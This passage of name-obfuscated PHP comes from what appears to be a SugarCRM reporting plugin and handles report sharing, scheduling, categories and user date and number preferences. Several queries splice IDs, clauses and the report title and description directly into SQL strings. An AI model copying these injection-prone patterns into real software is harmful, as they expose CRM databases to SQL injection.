".$ZZZP1515." ".$ZZZZb1.$ZZZZc2." ORDER BY r.`sequence` ASC";}else{if(empty($ZZZZ2525) || (count($ZZZZ2525) == 1 && $ZZZZ2525[0]=="")){$ZZZZ2525 = array(-1);} $query = "SELECT r.* , `a`.`can_edit` as `can_edit`, `a`.`can_delete` as `can_delete` FROM advancedreports r LEFT JOIN (SELECT r2.`id` as id, COUNT(*) as 'cnt', IFNULL(IFNULL(SUM(`g`.`level`),0) +IFNULL(SUM(`u`.`level`),0) +IF(`r2`.`owner`='$ZZZY2424' OR `r2`.`sharedlevel`=1 ,1,0), 0) as `can_edit`, sum(IF(`u`.`level`=2,1,0)+ IF(`g`.`level`=2,1,0)+ IF(`r2`.`owner`='$ZZZY2424' OR `r2`.`sharedlevel`=2,1,0)) as `can_delete` FROM `advancedreports` `r2` LEFT JOIN `advancedreports_sharedusers` `u` on u.report_id = r2.id LEFT JOIN `advancedreports_sharedgroups` `g` on g.report_id = r2.id WHERE (r2.owner = '$ZZZY2424' OR u.user_id = '$ZZZY2424' OR g.group_id IN (". implode(",",$this->ZZK1010($ZZZZ2525)).")) OR r2.shared = 1 GROUP BY r2.id) `a` ON `a`.`id` = `r`.`id` WHERE `a`.`cnt`>0 AND `r`.`category_id` = ".$ZZZP1515." ".$ZZZZb1.$ZZZZc2." ORDER BY r.`sequence` ASC";} $ZZS1818 = $this->run_query_allrecords($query);return $ZZS1818;} function ZZZZd3($id,$title,$description){$this->ZZH77("UPDATE `advancedreports` SET `title`=?, `description`=? WHERE `id` = ?", array($title, $description, $id));} function deleteReport($id){$this->ZZH77("DELETE FROM `advancedreports` WHERE `id` = ?", array($id));} function ZZZZe4($ZZq16){$ZZS1818 = $this->run_query_allrecords($ZZq16);return $ZZS1818;} function ZZZZf5(){return $this->ZZZZe4("SELECT `id`, TRIM(CONCAT(IFNULL(`first_name`, ''), ' ', IFNULL(`last_name`, ''))) as `name` FROM `users` WHERE `status`='Active'");} function ZZZZg6($ZZZC22){return $this->ZZZZe4("SELECT `user_id` as `id`, `level` FROM `advancedreports_sharedusers` WHERE `report_id`=$ZZZC22");} function ZZZZh7($ZZZC22){return $this->ZZZZe4("SELECT `user` as `user` FROM `advancedreports_schedule_u` WHERE `id`=$ZZZC22");} function ZZZZi8($ZZZC22){return $this->ZZZZe4("SELECT `group` as `group` FROM `advancedreports_schedule_g` WHERE `id`=$ZZZC22");} function ZZZZj9($ZZZC22){return $this->ZZZZe4("SELECT `role` as `role` FROM `advancedreports_schedule_r` WHERE `id`=$ZZZC22");} function ZZZZk10($ZZZC22){$ZY2424 = $this->ZZZZe4("SELECT `emails` FROM `advancedreports_schedule` WHERE `id`=$ZZZC22");$ZZS1818 = "{}";if(isset($ZY2424[0]['emails'])){$ZZS1818 = $ZY2424[0]['emails'];} return json_decode($ZZS1818,true);} function ZZZZl11($ZZZZm12,$ZZZZn13,$ZZZZo14){$ZZS1818 = null;$ZZS1818 = $this->run_query_allrecords("SELECT r.relmodule AS `module` FROM vtiger_field f LEFT JOIN vtiger_fieldmodulerel r on r.fieldid=f.fieldid WHERE block = ". (int)$ZZZZo14." AND tablename = '$ZZZZm12' AND columnname = '$ZZZZn13'");return $ZZS1818;} function ZZZZp15($ZZZC22){return $this->ZZZZe4("SELECT `group_id` as `id`, `level` FROM `advancedreports_sharedgroups` WHERE `report_id`=$ZZZC22");} function ZZZZq16(){return $this->ZZZZe4("SELECT `groupid` as `id`, `groupname` as `name` FROM `vtiger_groups`");} function ZZZZr17(){return $this->ZZZZe4("SELECT `id`, `name` FROM `acl_roles`");} function ZZZZs18($ZZZZt19){$ZZZZu20 = array();$ZZZZv21 = $this->ZZZZe4("SELECT `user_id` FROM `acl_roles_users` WHERE `role_id` = '$ZZZZt19' AND `deleted` = 0 ");foreach($ZZZZv21 as $ZZZY2424){$ZZZZu20[] = $ZZZY2424['user_id'];} return $ZZZZu20;} function ZZZZw22($ZZZY2424,$ZZZZ2525,$ZZZC22){if(empty($ZZZZ2525) || (count($ZZZZ2525) == 1 && $ZZZZ2525[0] == "")){$ZZZZ2525 = array(-1);} $ZZq16 = "SELECT MAX(`level`) AS `level` FROM (SELECT `level` FROM `advancedreports_sharedgroups` WHERE `report_id` = $ZZZC22 AND `group_id` IN (". implode(",",$this->ZZK1010($ZZZZ2525)).") UNION ALL SELECT `level` FROM `advancedreports_sharedusers` WHERE `report_id` = $ZZZC22 AND `user_id` = '$ZZZY2424' UNION ALL SELECT `sharedlevel` AS `level` FROM `advancedreports` WHERE `id` = $ZZZC22 AND `shared` = 1) AS `lvl_tbl`";$ZZS1818 = $this->ZZZZe4($ZZq16);return $ZZS1818;} function ZZZZx23($report,$ZZZZy24){$this->db->query("DELETE FROM advancedreports_sharedgroups WHERE report_id=$report");$ZZT1919 = count($ZZZZy24);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$this->ZZH77("INSERT INTO advancedreports_sharedgroups(`report_id`, `group_id`, `level`) VALUES(?,?,?)",$ZZZZy24[$Zf5]);}} function ZZZZz25($report,$ZZZZA00){$this->db->query("DELETE FROM advancedreports_sharedusers WHERE report_id=$report");$ZZT1919 = count($ZZZZA00);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$this->ZZH77("INSERT INTO advancedreports_sharedusers(`report_id`, `user_id`, `level`) VALUES(?,?,?)",$ZZZZA00[$Zf5]);}} function ZZZZB11($report,$ZZZZy24){$this->db->query("DELETE FROM advancedreports_schedule_g WHERE id=$report");$ZZT1919 = count($ZZZZy24);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$this->ZZH77("INSERT INTO advancedreports_schedule_g(`id`, `group`) VALUES(?,?)",array($report,$ZZZZy24[$Zf5]));}} function ZZZZC22($report,$ZZZZA00){$this->db->query("DELETE FROM advancedreports_schedule_u WHERE id=$report");$ZZT1919 = count($ZZZZA00);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$this->ZZH77("INSERT INTO advancedreports_schedule_u(`id`, `user`) VALUES(?,?)",array($report,$ZZZZA00[$Zf5]));}} function ZZZZD33($report,$ZZZZE44){$this->db->query("DELETE FROM advancedreports_schedule_r WHERE id=$report");$ZZT1919 = count($ZZZZE44);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$this->ZZH77("INSERT INTO advancedreports_schedule_r(`id`, `role`) VALUES(?,?)",array($report,$ZZZZE44[$Zf5]));}} function ZZZZF55($ZZZZG66="*", $ZZZW2222="", $ZZZZH77="", $limit=""){$ZZq16 = "SELECT $ZZZZG66 FROM `{$this->dbPrefix}advancedreports_categories`";if(!empty($ZZZW2222)){$ZZq16.=" WHERE {$ZZZW2222}";} if(!empty($ZZZZH77)){$ZZq16.=" ORDER BY {$ZZZZH77}";} if(!empty($limit)){$ZZq16.=" LIMIT {$limit}";} $ZZq16.=";";$ZZZZI88 = $this->ZZZu20($ZZq16);return $ZZZZI88;} function ZZZZJ99($ZZZZK1010){$ZZq16 = "SELECT MAX(`sequence`) FROM advancedreports WHERE category_id = {$ZZZZK1010['selectedCategory']}";$ZZZS1818 = $this->ZZZu20($ZZq16);$ZZZS1818 = $ZZZS1818[0][0];if(empty($ZZZS1818)){$ZZZS1818 = 1;}else{$ZZZS1818++;} $ZZZF55 = $ZZZZK1010['owner'];$ZZq16 = "INSERT INTO `advancedreports`(`category_id`, `sequence`, `module`, `related_data`, `fields`, `filters`, `grouping`, `aggregates`, `totalAggregates`, `title`, `description`, `options`, `chart`, `owner`, `shared`, `sharedlevel`, `iscombined`, `combinedfields`) VALUES ({$ZZZZK1010['selectedCategory']},{$ZZZS1818},'{$ZZZZK1010['mainModuleName']}',{$ZZZZK1010['selectedModules']},'[]','[]','[]','[]','{}','{$ZZZZK1010['reportTitle']}','{$ZZZZK1010['reportDescription']}','{\"includeDetails\":true,\"isCrosstab\":false,\"aggregateColumn\":false}','{\"chartTitle\":\"\",\"chartType\":\"pie\",\"chartLabels\":\"\",\"chartAxisX\":\"\",\"chartAxisY\":\"\",\"chartAxisY2\":\"\",\"chartYAxisType\":\"\",\"chartYAxis2Type\":\"\",\"chartLegend\":\"\",\"chartStacked\":false}','{$ZZZF55}',0,0,{$ZZZZK1010['selectedReportType']},'{}');";$this->ZZZv21($ZZq16);$ZY2424 = $this->ZZZv21('SELECT last_insert_id()');list($ZZZZL1111) = $ZY2424->fetch_row();return $ZZZZL1111;} function ZZZZM1212(){return $this->ZZZZe4(" SELECT `lhs_module`, `join_table`, `rhs_module`, `join_key_lhs`, `join_key_rhs` FROM `relationships` WHERE `relationships`.`join_table` IS NOT NULL AND `relationships`.`deleted` = 0");} function ZZZZN1313($ZZZZO1414, $Zu20, $value){$ZZZZO1414 = (int)$ZZZZO1414;if($ZZZZO1414 <= 0) return;if($Zu20 == "report") {$ZZq16 = "UPDATE `{$this->dbPrefix}advancedreports` SET `visible` = ? WHERE `id` = ? ";} else {$ZZq16 = "UPDATE `{$this->dbPrefix}advancedreports_categories` SET `visible` = ? WHERE `id` = ? ";$ZZZZP1515 = array();if($value == 1){$ZZZZP1515 = $this->ZZZZF55($ZZZZG66="parent_id AS folder_id", $ZZZW2222="id={$ZZZZO1414}");}elseif($value == 0){$ZZZZP1515 = $this->ZZZZF55($ZZZZG66="id AS folder_id", $ZZZW2222="parent_id={$ZZZZO1414}");} foreach($ZZZZP1515 as $ZZZZQ1616){if($ZZZZQ1616['folder_id'] ==0)continue;$this->ZZZZN1313($ZZZZQ1616['folder_id'], $Zu20, $value);}} $this->ZZH77($ZZq16, array($value, $ZZZZO1414));} function ZZZZR1717(){global $current_user, $mod_strings;$adb = DBManagerFactory::getInstance();$db = new ZZp15($adb);$ZZZZS1818 = new ZZZZT1919();$ZZZX2323 = $ZZZZS1818->ZZZZU2020($current_user);$ZZZY2424 = $ZZZZS1818->ZZZZV2121($current_user);$ZZZZ2525 = $ZZZZS1818->getUserGroups($ZZZY2424);$ZZS1818 = null;$ZZZZb1 = " AND ";$ZZZZc2 = " `r`.`visible` = 1 ";if($ZZZX2323){$query = "SELECT r.*, 2 as `can_edit`, 1 as `can_delete` FROM advancedreports r WHERE ".$ZZZZc2." ORDER BY r.`sequence` ASC";}else{if(empty($ZZZZ2525) || (count($ZZZZ2525) == 1 && $ZZZZ2525[0]=="")){$ZZZZ2525 = array(-1);} $query = "SELECT r.* , `a`.`can_edit` as `can_edit`, `a`.`can_delete` as `can_delete` FROM advancedreports r LEFT JOIN (SELECT r2.`id` as id, COUNT(*) as 'cnt', IFNULL(IFNULL(SUM(`g`.`level`),0) +IFNULL(SUM(`u`.`level`),0) +IF(`r2`.`owner`='$ZZZY2424' OR `r2`.`sharedlevel`=1 ,1,0), 0) as `can_edit`, sum(IF(`u`.`level`=2,1,0)+ IF(`g`.`level`=2,1,0)+ IF(`r2`.`owner`='$ZZZY2424' OR `r2`.`sharedlevel`=2,1,0)) as `can_delete` FROM `advancedreports` `r2` LEFT JOIN `advancedreports_sharedusers` `u` on u.report_id = r2.id LEFT JOIN `advancedreports_sharedgroups` `g` on g.report_id = r2.id WHERE (r2.owner = '$ZZZY2424' OR u.user_id = '$ZZZY2424' OR g.group_id IN (". implode(",",$this->ZZK1010($ZZZZ2525)).")) OR r2.shared = 1 GROUP BY r2.id) `a` ON `a`.`id` = `r`.`id` WHERE `a`.`cnt`>0 ".$ZZZZb1.$ZZZZc2." ORDER BY r.`sequence` ASC";} $ZZS1818 = $this->run_query_allrecords($query);return $ZZS1818;}} ;class ZZZZT1919{function ZZZZV2121($ZZZZW2222){return $ZZZZW2222->id;} function ZZZZX2323($ZZZZW2222){global $sugar_config;$ZZZZY2424 = '.';$ZZZZZ2525 = ',';$ZZZZZa0 = $ZZZZW2222->getPreference('num_grp_sep');$ZZZZZb1 = $ZZZZW2222->getPreference('dec_sep');$ZZZZZc2 = $sugar_config['default_number_grouping_seperator'];$ZZZZZd3 = $sugar_config['default_decimal_seperator'];$ZZZZZa0 = isset($ZZZZZa0)? $ZZZZZa0:$ZZZZZc2;$ZZZZZb1 = isset($ZZZZZb1)? $ZZZZZb1:$ZZZZZd3;$ZZZZZa0 = isset($ZZZZZa0)? $ZZZZZa0:$ZZZZY2424;$ZZZZZb1 = isset($ZZZZZb1)? $ZZZZZb1:$ZZZZZ2525;$ZZS1818 = array('format' => "123,456,789" , 'seperator' => $ZZZZZa0, 'decimal' => $ZZZZZb1);return $ZZS1818;} function ZZZZZe4($ZZZZW2222){$ZZZZZf5 = $ZZZZW2222->getUserDateTimePreferences();$ZZZZZf5['date'];$ZZZZZf5['time'];$ZZZZZf5['userGmt'];$ZZZZZf5['userGmtOffset'];return 'mm-dd-yyyy';} function ZZZZZg6(){echo "RECORD is not ACCESSIBLE";} function ZZZZU2020($ZZZZW2222){return is_admin($ZZZZW2222);} function getUserGroups($ZZZY2424){include_once "modules/ACLRoles/ACLRole.php";$ZZZZE44 = ACLRole::getUserRoles($ZZZY2424, false);$ZZS1818 = array();foreach ($ZZZZE44 as $Zu20 => $value) {$ZZS1818[] = $value->id;} return $ZZS1818;} function ZZZZZh7($ZZZZZi8){return array();return $ZZS1818;} function getRoleUsers($ZZZZt19, ZZp15 $db){$ZZZZZj9 = $db->ZZZZs18($ZZZZt19);return $ZZZZZj9;} function ZZZZZk10($ZZZZZl11,$module = ""){if(in_array($module,array("Inventory","Inventory2"))){$module = "SalesOrder";}elseif($module == "Events"){$module = "Calendar";if(in_array($ZZZZZl11,array("LBL_DURATION_H" ,"LBL_DURATION_DAY"))){$module = "AnalyticReporting";}}elseif(in_array($module,array("CampaignAcc","CampaignCont","CampaignLead"))){$module = "Campaigns";}elseif($module == "Leads" && $ZZZZZl11 == "LBL_LEAD_CONVERTED"){$module = "AnalyticReporting";} $ZZS1818 = translate($ZZZZZl11, $module);return $ZZS1818;} function ZZZZZm12($name,$module,ZZp15 $db){$ZZZZZn13 = $db->ZZN1313($name, $module);return $ZZZZZn13;} function ZZZZZo14($name,$module,ZZp15 $db){$ZZS1818 = array(1 =>	$this->ZZZZZk10("--None--",$module), 2 =>	$this->ZZZZZk10("Contacted - Successful",$module), 3 =>	$this->ZZZZZk10("Contacted - Unsuccessful",$module), 4 =>	$this->ZZZZZk10("Contacted - Never Contact Again",$module),);return $ZZS1818;} function ZZZZZp15($module){$ZZZZZq16 = $this->ZZZb1($module);return array('name'=>$ZZZZZq16->table_name,'idCol'=> 'id');} function ZZZZZr17($module){$ZZS1818 = null;if($module ==="Calendar" || $module ==="Activity" || $module ==="Events"){include_once "modules/Calendar/Activity.php";$ZZS1818 = new Activity();}elseif($module ==="Inventory"){$ZZS1818 = array('tab_name_index' => array('vtiger_inventoryproductrel'=>'lineitem_id'), 'table_name' => 'vtiger_inventoryproductrel', 'table_index' => 'lineitem_id');}elseif($module ==="Inventory2"){$ZZS1818 = array('tab_name_index' => array('vtiger_inventoryproductrel'=>'lineitem_id'), 'table_name' => 'vtiger_inventoryproductrel', 'table_index' => 'lineitem_id');}elseif($module == "CampaignAcc"){$ZZS1818 = array('tab_name_index' => array('vtiger_campaignaccountrel'=>'accountid'), 'table_name' => 'vtiger_campaignaccountrel', 'table_index' => 'accountid');}elseif($module == "CampaignCont"){$ZZS1818 = array('tab_name_index' => array('vtiger_campaigncontrel'=>'contactid'), 'table_name' => 'vtiger_campaigncontrel', 'table_index' => 'contactid');}elseif($module == "CampaignLead"){$ZZS1818 = array('tab_name_index' => array('vtiger_campaignleadrel'=>'leadid'), 'table_name' => 'vtiger_campaignleadrel', 'table_index' => 'leadid');} return ($ZZS1818)? ((object) $ZZS1818): ($ZZS1818);} function ZZZb1($module){$ZZZZZq16 = $this->ZZZZZr17($module);if(!$ZZZZZq16){$ZZZZZq16 = PlatformConnector::ZZZb1($module);} return $ZZZZZq16;} function ZZZZZs18($module){$ZZZZZq16 = $this->ZZZb1($module);$ZZS1818 = array();$ZZZZZt19 = 'id';$ZZS1818[] = array('name' => $ZZZZZq16->table_name, 'idCol' => $ZZZZZt19);$ZZS1818[] = array('name' => $ZZZZZq16->table_name."_cstm", 'idCol' => $ZZZZZt19."_c");return $ZZS1818;} function ZZZZZu20($field,$db){$ZZS1818 = array();$ZZZz25 = $db->ZZZZl11($field['tablename'],$field['columnname'],$field['block']);foreach($ZZZz25 as $ZZZZZv21){$ZZS1818[] = $ZZZZZv21["module"];} return $ZZS1818;} function ZZZZZw22($field,$db,$ZZZZZx23,$module = false){$ZZS1818 = false;if($field['fieldname']=="00_ALL_assigned_user_id"){return false;} if($this->ZZZZZy24($field)){$ZZS1818 = true;}else{$module = ($module)?($module):($ZZZZZx23[$field['module']]->name);if($module == 'oqc_Service') {return false;} $ZZZZZz25 = $db->ZZZo14($module,$field);if(!empty($ZZZZZz25["field"])){$ZZZZZA00 = array_search($field['fieldname'],$ZZZZZz25["names"]);$ZZZZZB11 = array_search($field['fieldname_org'],$ZZZZZz25["names"]);if($ZZZZZA00!==false || $ZZZZZB11!==false){$ZZS1818 = true;}}} return $ZZS1818;} function ZZZZZC22($field){$ZZS1818 = false;if(in_array($field["uitype"], array('int', 'currency', 'number', 'float'))){$ZZS1818 = true;} return $ZZS1818;} function ZZZZZD33($field){$ZZS1818 = false;if(in_array($field["uitype"],array('datetime', 'datetimecombo'))){$ZZS1818 = true;} return $ZZS1818;} function ZZZZZy24($field){if(isset($field['uitype']) && in_array($field['uitype'], array('relate', 'assigned_user_name'))) {return true;} return false;} function ZZZZZE44($ZZZZZF55){$ZZZZZG66 = array(1 => "Jan", 2 => "Feb", 3 => "Mar", 4 => "Apr", 5 => "May", 6 => "Jun", 7 => "Jul", 8 => "Aug", 9 => "Sep", 10=> "Oct", 11=> "Nov", 12=> "Dec",);return $ZZZZZG66[$ZZZZZF55];} function ZZZZZH77($ZZZc2, $ZZZG66 = false){$ZZS1818 = array();$ZZT1919 = count($ZZZc2);if($ZZZc2[$ZZT1919-1] == "-"){array_pop($ZZZc2);$ZZT1919--;} for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZS1818[$ZZZc2[$Zf5]["fieldname"]] = $ZZZc2[$Zf5];} $ZZZZZI88 = count($ZZZG66);$ZZZZZJ99 = array();for($ZZZZZK1010 = 0;$ZZZZZK1010 < $ZZZZZI88;$ZZZZZK1010++) {if(isset($ZZZG66[$ZZZZZK1010]["dateGrouping"]) && !empty($ZZZG66[$ZZZZZK1010]["dateGrouping"])) {$ZZZZZL1111 = $ZZZG66[$ZZZZZK1010]["name"] . '_' . $ZZZG66[$ZZZZZK1010]["dateGrouping"];$ZZZZZJ99[$ZZZZZL1111] = $ZZZG66[$ZZZZZK1010]["dateGrouping"];}} if(isset($ZZZZZJ99)) {for($Zf5 = 0;$Zf5 < $ZZT1919;$Zf5++){if(isset($ZZZc2[$Zf5]["dateGrouping"]) && !empty($ZZZc2[$Zf5]["dateGrouping"])) {if($ZZZZZJ99[$ZZZc2[$Zf5]["fieldname"]]) {foreach($ZZZZZJ99 as $ZZZZZM1212 => $ZZZZZN1313) {$ZZZZZO1414 = $ZZZc2[$Zf5];$ZZZZZO1414["fieldname"] = $ZZZZZM1212;$ZZZZZO1414["dateGrouping"] = $ZZZZZN1313;$ZZS1818[$ZZZZZM1212] = $ZZZZZO1414;}}}}} return $ZZS1818;} function ZZZZZP1515($ZZZZZQ1616, $ZZZZZR1717){$ZZZZZS1818 = array();foreach ($ZZZZZQ1616 as $report) {$ZZZZZT1919 = array('name' => $report['id'], 'title' => $report['title'],);if($ZZZZZR1717 == $report['id']){$ZZZZZT1919['title'] = "Current";array_unshift($ZZZZZS1818, $ZZZZZT1919);continue;} $ZZZZZS1818[] = $ZZZZZT1919;} return $ZZZZZS1818;} function ZZZZZU2020($G66=array(), $ZZZZZV2121=""){foreach ($G66 as $ZZZZZW2222 => $value) {$G66[$ZZZZZW2222] = "{$ZZZZZV2121}".$value."{$ZZZZZV2121}";} return $G66;}}
;class PlatformConnector {static private $ZZZZZX2323 = null;public static function ZZZZZY2424($moduleName){$ZZZa0 = self::ZZZb1($moduleName);$ZZY2424 = $ZZZa0->table_name;return $ZZY2424;} public static function ZZZZZZ2525() {$ZZZZZZa0 = array('AnalyticReporting');$ZZZZZZb1 = array('AOS_Products_Quotes', 'EmailAddresses', 'ProjectTask', 'Users');$moduleList = array_intersect($GLOBALS['moduleList'],array_keys($GLOBALS['beanList']));foreach($ZZZZZZa0 as $module){if($Zu20=array_search($module, $moduleList)) unset($moduleList[$Zu20]);} foreach ($ZZZZZZb1 as $ZZZZZW2222 => $ZZZZZZc2) {if(isset($GLOBALS['beanList'][$ZZZZZZc2]) && !in_array($ZZZZZZc2, $moduleList)){$moduleList[] = $ZZZZZZc2;}} return $moduleList;} public static function ZZZb1($moduleName) {return FunctionWrapper::_getBean($moduleName);} public static function ZZZZU2020($ZZZZW2222) {if(is_admin($ZZZZW2222))return true;return false;} public static function getSystemUser($ZZZY2424 = null) {global $current_user;$ZZZZZZd3 = $current_user;if($current_user->id != $ZZZY2424) {$ZZZZZZd3 = new User();$ZZZZZZd3 = $ZZZZZZd3->retrieve($ZZZY2424);} return $ZZZZZZd3;} public static function ZZZZZZe4($ZZZY2424 = null) {global $current_user;if(!$ZZZY2424) {global $current_user;$ZZZZW2222 = $current_user;} else {$ZZZZW2222 = new User();$ZZZZW2222 = $ZZZZW2222->retrieve($ZZZY2424);} return self::ZZZZZZf5($ZZZZW2222);} public static function getAdminUser() {include_once "modules/Users/User.php";$ZZZZW2222 = new User();return self::ZZZZZZf5($ZZZZW2222->getSystemUser());} public static function ZZZZZZf5(User $ZZZZW2222) {$ZZZZZZg6 = 24;if (strpos($ZZZZW2222->getPreference('timef'), 'H') === false) {$ZZZZZZg6 = 12;} global $sugar_config;$ZZZZZZh7 = '.';$ZZZZZ2525 = ',';$ZZZZZZi8 = 2;$ZZZZZZj9 = $ZZZZW2222->getPreference('num_grp_sep');$ZZZZZb1 = $ZZZZW2222->getPreference('dec_sep');$ZZZZZZk10 = $ZZZZW2222->getPreference('default_currency_significant_digits');$ZZZZZZl11 = $sugar_config['default_number_grouping_seperator'];$ZZZZZd3 = $sugar_config['default_decimal_seperator'];$ZZZZZZm12 = $sugar_config['default_currency_significant_digits'];$ZZZZZZj9 = isset($ZZZZZZj9)? $ZZZZZZj9:$ZZZZZZl11;$ZZZZZb1 = isset($ZZZZZb1)? $ZZZZZb1:$ZZZZZd3;$ZZZZZZk10 = isset($ZZZZZZk10)? $ZZZZZZk10:$ZZZZZZm12;$ZZZZZZj9 = isset($ZZZZZZj9)? $ZZZZZZj9:$ZZZZZZh7;$ZZZZZb1 = isset($ZZZZZb1)? $ZZZZZb1:$ZZZZZ2525;$ZZZZZZk10 = isset($ZZZZZZk10)? $ZZZZZZk10:$ZZZZZZi8;$numberPreferences = array('format' => "123,456,789" , 'separator' => $ZZZZZZj9, 'decimal' => $ZZZZZb1, 'currencySignificantDigits' => $ZZZZZZk10);$ZZZx23 = array('id' => $ZZZZW2222->id, 'numberPreferences' => array('format' => $numberPreferences['format'], 'seperator' => $numberPreferences['separator'], 'decimal' => $numberPreferences['decimal'], 'currencySignificantDigits' => $numberPreferences['currencySignificantDigits'],), 'hourFormat' => $ZZZZZZg6, 'dateFormat' => "yyyy-mm-dd", 'timeZone' => TimeDate::userTimezone($ZZZZW2222), 'isAdmin' => is_admin($ZZZZW2222), 'email' => $ZZZZW2222->emailAddress->getPrimaryAddress($ZZZZW2222), 'name' => $ZZZZW2222->full_name, 'roleIds' => array(),);return new ARUser($ZZZx23);} public static function ZZZZZZn13($ZZZZZZo14){$ZZZZZZp15 = array();foreach ($ZZZZZZo14 as $ZZZZZZq16) {$ZZZZZZp15[$ZZZZZZq16['lhs_module']][] = array('tableName' => $ZZZZZZq16['join_table'], 'applicableModules' => array(0 => $ZZZZZZq16['rhs_module']), 'relModule' => false, 'columns' => array(0 => array('name' => $ZZZZZZq16['join_key_lhs'], 'title' => $ZZZZZZq16['join_key_lhs']), 1 => array('name' => $ZZZZZZq16['join_key_rhs'], 'title' => $ZZZZZZq16['join_key_rhs'])));} return $ZZZZZZp15;} public static function ZZZZZZr17(){if(!isset(self::$ZZZZZX2323)){self::$ZZZZZX2323 = new ZZp15(DBManagerFactory::getInstance());} return self::$ZZZZZX2323;} public static function ZZZZZZs18($ZZZZZZt19) {foreach($ZZZZZZt19 as &$ZZZZZZu20) {if(is_string($ZZZZZZu20)) {$ZZZZZZu20 = str_replace('"00_', '"m00_', $ZZZZZZu20);$ZZZZZZu20 = str_replace('"0_', '"m0_', $ZZZZZZu20);$ZZZZZZu20 = str_replace('"1_', '"m1_', $ZZZZZZu20);$ZZZZZZu20 = str_replace('"2_', '"m2_', $ZZZZZZu20);$ZZZZZZu20 = str_replace('"3_', '"m3_', $ZZZZZZu20);$ZZZZZZu20 = str_replace('"4_', '"m4_', $ZZZZZZu20);$ZZZZZZu20 = str_replace('"5_', '"m5_', $ZZZZZZu20);$ZZZZZZu20 = str_replace('"6_', '"m6_', $ZZZZZZu20);$ZZZZZZu20 = str_replace('"7_', '"m7_', $ZZZZZZu20);$ZZZZZZu20 = str_replace('"8_', '"m8_', $ZZZZZZu20);$ZZZZZZu20 = str_replace('"9_', '"m9_', $ZZZZZZu20);}} return $ZZZZZZt19;} public static function ZZZZZZv21() {$adb = DBManagerFactory::getInstance();return new ZZp15($adb);} public static function ZZZZZZw22() {if(DBManagerFactory::getInstance()->dbType == "mysql") {return "mysql";} else {return "mssql";}} public static function getUrl($S1818 = "") {$ZU2020 = SugarConfig::getInstance();$ZZZZZZx23 = $ZU2020->get('site_url');$ZZZZZW2222 = "/index.php";if (PlatformConnector::ZZZZZZy24()) {$ZZZZZW2222 = "/#bwc/index.php";} $ZZZZZZx23 .= $ZZZZZW2222;if(!empty($S1818)){$ZZZZZZx23 .= $S1818;} return $ZZZZZZx23;} public static function ZZZZZZy24(){global $sugar_version;if (version_compare($sugar_version, '7.0.0') >= 0) {return true;} return false;} public static function ZZZZZZz25(){global $current_user;$ZZZZW2222 = $current_user;global $sugar_config;$ZZZZZZi8 = 2;$ZZZZZZk10 = $ZZZZW2222->getPreference('default_currency_significant_digits');$ZZZZZZm12 = $sugar_config['default_currency_significant_digits'];$ZZZZZZk10 = isset($ZZZZZZk10)? $ZZZZZZk10:$ZZZZZZm12;$ZZZZZZk10 = isset($ZZZZZZk10)? $ZZZZZZk10:$ZZZZZZi8;return $ZZZZZZk10;} public static function ZZZZZZA00(ARUser $ZZZZW2222, $value){global $timedate;if(empty($value)){return $value;} $value = self::ZZZZZZB11($ZZZZW2222, $value);return $timedate->getDatePart($value);} public static function ZZZZZZB11(ARUser $ZZZZW2222, $value){global $timedate;$ZZZZZZd3 = PlatformConnector::getSystemUser($ZZZZW2222->ZZZZZZC22());$ZZZZZZD33 = $timedate->fromDb($value, true);if(empty($ZZZZZZD33)){return $value;} $ZZZZZZE44 = $timedate->tzUser($ZZZZZZD33, $ZZZZZZd3);return $ZZZZZZE44->asDb(false);} public static function getDate($ZZZZW2222, $value){global $timedate;$value = self::ZZZZZZF55($ZZZZW2222, $value);return $timedate->getDatePart($value);} public static function ZZZZZZF55($ZZZZW2222, $value){global $timedate;$ZZZZZZE44 = $timedate->fromDb($value, true);return $ZZZZZZE44->asDb(true);} public static function ZZZZZZG66(ARUser $ZZZZW2222, $value) {global $timedate;if(empty($value)){return $value;} $ZZZZZZd3 = PlatformConnector::getSystemUser($ZZZZW2222->ZZZZZZC22());$ZZZZZZH77 = $timedate->fromString($value);$ZZZZZZE44 = $timedate->tzUser($ZZZZZZH77, $ZZZZZZd3);return $ZZZZZZE44->asDb(true);} public static function ZZZZZZI88(ARUser $ZZZZW2222) {global $timedate;$ZZZZZZd3 = PlatformConnector::getSystemUser($ZZZZW2222->ZZZZZZC22());$ZZZZZZJ99 = $timedate->getNow();$ZZZZZZE44 = $timedate->tzUser($ZZZZZZJ99, $ZZZZZZd3);return $ZZZZZZE44->get_day_begin()->asDb(true);} public static function ZZZZZZK1010(ARUser $ZZZZW2222) {global $timedate;$ZZZZZZd3 = PlatformConnector::getSystemUser($ZZZZW2222->ZZZZZZC22());$ZZZZZZJ99 = $timedate->getNow();$ZZZZZZE44 = $timedate->tzUser($ZZZZZZJ99, $ZZZZZZd3);return $ZZZZZZE44->get_day_end()->asDb(true);} public static function ZZZZZZL1111(ARUser $ZZZZW2222, $ZZZZZZM1212 = false) {global $timedate;$ZZZZZZd3 = PlatformConnector::getSystemUser($ZZZZW2222->ZZZZZZC22());$value = $ZZZZZZd3->getPreference('timezone', 'global');if (!$value) {$value = $timedate->guessTimezone();} if (!$value) {$value = 'UTC';} return $value;} public static function ZZZZZZN1313($name = "UTC") {$ZZZZZZO1414 = new DateTimeZone($name);$ZZZZZZJ99 = new DateTime("now", $ZZZZZZO1414);return $ZZZZZZJ99->format("P");}}
;abstract class ZZZZZZP1515 {protected $db;function __construct() {$this->db = PlatformConnector::ZZZZZZv21();}}
;class ZZZZZZQ1616 extends ZZZZZZP1515
